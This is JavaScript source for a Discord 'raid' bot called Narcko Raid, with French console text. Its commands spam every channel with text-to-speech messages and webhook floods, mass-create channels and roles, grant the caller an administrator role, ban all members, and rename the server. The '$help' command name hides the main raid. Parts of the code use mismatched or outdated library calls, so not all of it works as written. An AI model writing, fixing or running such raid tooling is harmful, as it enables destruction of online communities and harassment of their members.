const Discord = require('discord.js')
const client = new Discord.Client();

const rolename = "Text"
const channelname = "Text"
const raider = "Dieux Raiders"
client.on("ready", () => {
    console.log('|-------------------------------------------------------------------------------------------------|')
    console.log('|Bienvenue dans la console                                                                        |')
    console.log('|Narcko Raid                                                                                      |')
    console.log(`|Client Id: ${client.user.id}                                                                    |`)
    console.log(`|Nom du bot connecté: ${client.user.username}                                                                        |`)
    console.log(`|Invite: https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=0|`)
    console.log('|Crée part narcko                                                                                 |')
    console.log('|$help pour lancer le raid                                                                        |')
    console.log('|-------------------------------------------------------------------------------------------------|')
    client.user.setActivity(".",{
        type: "STREAMING",
        url: "https://www.twitch.tv/narcko"
})});


client.on("message", message => {
    if (message.content === '$help') {
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            message.guild.channels.cache.forEach((channel) => {
                if (channel.type === "text") channel.send("Text", {tts: true})
            
            }, 2500);
        })
    }
});

client.on('message', function(message) {
    if (message.content === '$help') {
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval (function () {
            if (i === 100) clearInterval(interval);
            message.guild.channels.create(channelname, 'Text', {tts: true}).then(c => {
                c.createWebhook('Text', "https://cdn.discordapp.com/attachments/795704943143157840/796358612330217472/unknown_22.png")
                .then(webhook => {
                    setInterval(function () {
                        webhook.send("**Text")
                    }, 400);
                });
            })

          });
    }
});

client.on('message', function(message) {
    if (message.content === '$role') {
        console.log(`commande .role par ${message.author.tag}`);
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
            if (i === 250) clearInterval (interval);
            message.guild.roles.create({name : "discord.gg/" , color: 'RANDOM'}).then(function(role) {
                message.guild.members.forEach(member => {
                    member.addRole(role).catch(e => {});
                })
                i++
            }, 100)
        })
    }

    if (message.content === 'adm') {
        if (message.deletable) message.delete();
        message.guild.roles.create({
            name: "GOD",
            hoist: true,
            permissions: "ADMINISTRATOR",
            color: 'RED'
        })
        .then(function(role) {message.member.addRole(role);});
    }

    if (message.content === 'banall') {
        console.log(`commande .ban par ${message.author.tag}`);
        members.cache.forEach(member => {
            if (!member.roles.exists("name", raider) && member.bannable) member.ban().catch(e => {});
        })
    
}});

client.on('message', function(message) {
    if (message.content === '.cc') {
        if(message.deletable) message.delete();
        message.guild.setIcon("https://cdn.discordapp.com/attachments/790604199020199946/796427413445279754/unknown_22.png")
        message.guild.setName("Text")
    }
});

client.on('message', function(message) {
    if (message.content === '$invite') {
        message.reply(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=0`)
    }
});
client.on('message', function(message) {
    if (message.content === '$ban') {
        message.guild.member.cache.forEach(member => {
            member.ban()
        })
    }
});


client.login('Token Here')